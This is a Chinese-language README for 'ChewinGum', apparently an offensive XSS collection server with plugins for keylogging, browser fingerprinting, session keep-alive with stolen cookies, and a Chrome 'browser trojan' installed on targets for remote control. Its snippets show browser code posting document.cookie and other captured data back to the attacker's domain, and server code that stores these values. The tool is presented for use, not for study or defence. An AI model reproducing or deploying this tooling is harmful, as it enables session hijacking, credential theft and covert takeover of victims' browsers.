# ChewinGum [beta][0.29][1140507]

Name
----
***ChewinGum - individual XSS Server***

Startup
-------
    python ./config.py install [ salt filekeyPath | -h ]
    python ./chewingum.py [ host port debug | -h ]

Dependencies
------------
* [Bottle-0.12](http://bottlepy.org/)
* [Bottle-websocket](https://github.com/zeekay/bottle-websocket/)
* [Pure](http://purecss.io/)

  unnecessaries
  -------------
    * [Beaker](http://beaker.rtfd.org/)

Reference
---------
* Gum.js            - [xss.js](http://zone.wooyun.org/content/2113)
* get_info.js       - [BeEF](http://beefproject.com/)
* wec_cssbug.html   - [CSS3事件的消息回调BUG](http://www.web-tinker.com/article/20339.html)
* get_networkip.js  - [Network IP Address via ipcalf.com](http://net.ipcalf.com/)
* tool_keylogger.js - [XSS keylogger](http://wiremask.eu/xss-keylogger/)

Helptext
--------

**1.Login**

采用filekey验证, 上传filekey或输入URL便可登录.

**2.Server**

server处代码会直接在项目触发时执行,  
最终会将变量serverinfo和变量browserinfo保存至数据库,  
格式需为json/dict格式

    {'name':'value'}

如:

    serverinfo = {
	    'referer':b64ens(request.headers.get('Referer')),
    	'ctime':b64ens(ctime())
	}
	browserinfo = {
    	'cookie':b64ens(request.forms.get('cookie')))
	}

**3.Server code keyword**

*ifstatus*  
对变量ifstatus赋值, 会触发对应status.  
如:

	ifstatus = 404

*returns*  
对变量returns赋值，会返回对其赋值的内容.  
如:

	returns = '<script>alert(1)</script>'

*gum.backinfo*  
客户端的关键字，是一个字典，默认用来暂时记录返回的信息。  
当返回之后最好清空它。

    gum.backinfo = {};

**4.Project name and Object name**

project 的项目名需是xss触发处的url或是domain.  
$default是默认项目, xss触发时若未发现对应项目则按照此配置进行.

	object 的项目名可随意更改.

**5.Plugins**

可以这样导入server扩展,

	with open('./static/serv/get_info.py') as files: exec files.read()

也可以这样

    from static.serv.email_remind import send_mail
    send_mail(gum_emailremind)

>    具体看扩展的写法

可以这样导入browser插件,

	gum.script('http://' + gum.domain + '/static/brows/tool_boomerang.js')


这样给browser插件传参,

	gum_boomerang = {
		'object_url':'http://localhost/xss',
		'post':{'xss':'yes', 'csrf':'no'},
		'eval':function(){alert(1)}
	}

同样的方法给server扩展传参,

	gum_keepsession = {
		'url':referer,
		'session':cookie,
		'data':{'a':'b'},
		'frequency':300,
		'endate':'2013-12-12 15:17:00'
	}

**6.Set code**

这样发送browser info,

    gum.post('http://' + gum.domain + '/ing', {'cookie':document.cookie})

单次接收browser info可以参考上面的2.server  
也可以这样

    browserinfo['infoname'] = b64ens(request.forms.get('infoname'))

多次接收browser info可以像这样,

    info_cookie = b64ens(request.forms.get('cookie'))
	sessionid[referer][1]['cookie'] = info_cookie
	browserinfo = sessionid.get(referer)

>	不推荐使用多次接收，默认已关闭。

**7.Easy example**

使用基本探针:

server:

    with open('./static/serv/get_info.py') as files: exec files.read()

browser:

    gum.script('http://' + gum.domain + '/static/brows/get_info.js', function(){
        gum.post('http://' + gum.domain + '/ing', gum.backinfo);
        gum.backinfo = {};
    })

**8.Console**

javascript文件在

    ./static/brows/onexsshell.js

>    尚在测试阶段。

**9.Browser trojan**

chrome  
修改./trojan/chrome/gum.js中的{{domain}}为你的chewingum的域名及端口  
使用chrome or chromium打包  
安装在目标的浏览器后，使用console即可操作目标浏览器。  

>    尚在测试阶段

**10.Plugins header specification**

    Author[Reference] - Date
        Name - Dependencies
                - Synopsis
            Example
                and
            Dependencies Plus

>   好吧我知道不会有人帮我写插件的...

Demo
----
![](http://quininer.github.io/image/xsshell_1.png)
![](http://quininer.github.io/image/xsshell_2.png)

Developers
----------
*   [quininer](mailto:quininer@live.com)([@quininers](https://twitter.com/quininers))
